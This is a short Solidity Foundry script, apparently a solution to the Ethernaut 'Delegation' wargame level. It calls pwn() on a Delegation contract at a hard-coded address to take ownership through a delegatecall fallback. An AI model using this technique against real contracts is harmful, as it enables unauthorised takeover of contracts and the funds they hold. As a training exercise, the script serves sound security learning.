// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../contracts/6Delegation.sol";
import "forge-std/Script.sol";

contract DelegateAttack is Script {
    function run() public {
        vm.startBroadcast();
        Delegation targetContract = Delegation(0x76D15665A853E8101526C07ff61b527f51446b52);
        // console.log(targetContract.owner());
        (bool success,) = address(targetContract).call(abi.encodeWithSelector(bytes4(keccak256("pwn()"))));
        // console.log(targetContract.owner());
        vm.stopBroadcast();
    }
}
